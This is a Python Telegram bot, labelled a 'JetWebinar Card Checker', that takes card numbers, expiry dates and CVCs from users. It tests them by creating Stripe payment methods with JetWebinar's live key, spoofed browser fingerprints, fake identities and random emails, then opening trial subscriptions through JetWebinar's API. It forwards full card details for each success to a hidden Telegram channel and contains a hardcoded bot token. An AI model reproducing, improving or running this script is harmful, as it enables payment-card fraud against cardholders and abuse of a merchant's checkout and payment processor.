import telebot
import requests
import random
import string

JETWEBINAR_BOT_TOKEN = "7018443911:AAGuZfbkaQc-s2icbMpljkjokKkzg_azkYI"
CHANNEL_ID = -1002170961342
bot = telebot.TeleBot(JETWEBINAR_BOT_TOKEN)

STRIPE_PUBLISHABLE_KEY = "pk_live_XwmzQS8EjYVv6D6ff4ycSP8W"

def generate_random_email():
    name = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
    return f"{name}@gmail.com"

def parse_card_input(text):
    parts = text.strip().split('|')
    if len(parts) != 4:
        return None
    card_number, exp_month, exp_year, cvc = map(str.strip, parts)
    if not (card_number.isdigit() and cvc.isdigit() and exp_month.isdigit() and (len(exp_year) == 2 or len(exp_year) == 4)):
        return None
    return card_number, exp_month.zfill(2), exp_year, cvc

@bot.message_handler(commands=['start'])
def start_handler(message):
    bot.send_message(message.chat.id,
        "💳 JetWebinar Card Checker\n"
        "Send card in this format:\n"
        "CardNumber|MM|YY|CVC\n"
        "CardNumber|MM|YYYY|CVC\n"
        "Example:\n4242424242424242|05|25|123"
    )

@bot.message_handler(func=lambda m: True)
def card_handler(message):
    try:
        parsed = parse_card_input(message.text)
        if not parsed:
            return bot.reply_to(message, "❌ Invalid format. Use: CardNumber|MM|YY|CVC or CardNumber|MM|YYYY|CVC")

        card_number, exp_month, exp_year, cvc = parsed
        if len(exp_year) == 2:
            exp_year = "20" + exp_year

        email = generate_random_email()
        phone = "3144740104"
        name = "Peshang Salam"
        postal_code = "10080"

        # 1. Create Stripe payment method
        stripe_data = {
            "type": "card",
            "billing_details[name]": name,
            "billing_details[email]": email,
            "billing_details[phone]": phone,
            "billing_details[address][postal_code]": postal_code,
            "card[number]": card_number,
            "card[cvc]": cvc,
            "card[exp_month]": exp_month,
            "card[exp_year]": exp_year[-2:],
            "key": STRIPE_PUBLISHABLE_KEY,
            "guid": ''.join(random.choices(string.ascii_lowercase + string.digits, k=32)),
            "muid": ''.join(random.choices(string.ascii_lowercase + string.digits, k=32)),
            "sid": ''.join(random.choices(string.ascii_lowercase + string.digits, k=32)),
            "payment_user_agent": "stripe.js/1cb064bd1e; stripe-js-v3/1cb064bd1e; card-element",
            "time_on_page": str(random.randint(10000, 99999)),
            "referrer": "https://www.jetwebinar.com"
        }
        stripe_resp = requests.post(
            "https://api.stripe.com/v1/payment_methods",
            data=stripe_data,
            headers={
                "content-type": "application/x-www-form-urlencoded",
                "accept": "application/json",
                "origin": "https://js.stripe.com",
                "referer": "https://js.stripe.com/"
            }
        )
        stripe_json = stripe_resp.json()
        pm_id = stripe_json.get("id", "")

        if "error" in stripe_json or not pm_id:
            bot.reply_to(message, f"❌ Card Declined (Stripe):\n{stripe_json.get('error', {}).get('message', stripe_json)}")
            return

        # 2. Send to JetWebinar
        jetwebinar_payload = {
            "name": name,
            "email": email,
            "phone": phone,
            "planId": "plan_basic_001",
            "paymentMethodId": pm_id,
            "isAnnual": False
        }
        jetwebinar_resp = requests.post(
            "https://www.jetwebinar.com/trial/api/create-subscription",
            json=jetwebinar_payload,
            headers={
                "content-type": "application/json",
                "accept": "*/*",
                "origin": "https://www.jetwebinar.com",
                "referer": "https://www.jetwebinar.com/trial/?p=500&t=a"
            }
        )
        resp_json = jetwebinar_resp.json()

        if "error" in resp_json:
            bot.reply_to(message, f"❌ Card Declined (JetWebinar):\n{resp_json.get('error', resp_json.get('message', 'Unknown error'))}")
        elif resp_json.get("success") is True:
            subscription_id = resp_json.get("subscriptionId", "N/A")
            success_msg = (
                f"✅ JetWebinar Payment Successful!\n"
                f"Card: {card_number} | {exp_month}/{exp_year} | {cvc}\n"
                f"Email: {email}\n"
                f"Subscription ID: {subscription_id}\n"
                f"Full Response:\n{resp_json}"
            )
            bot.reply_to(message, "✅ Your Card Was Added")
            bot.send_message(CHANNEL_ID, success_msg)
        else:
            bot.reply_to(message, f"Unexpected response:\n{resp_json}")

    except Exception as e:
        bot.reply_to(message, f"⚠️ Error: {str(e)}")

bot.infinity_polling()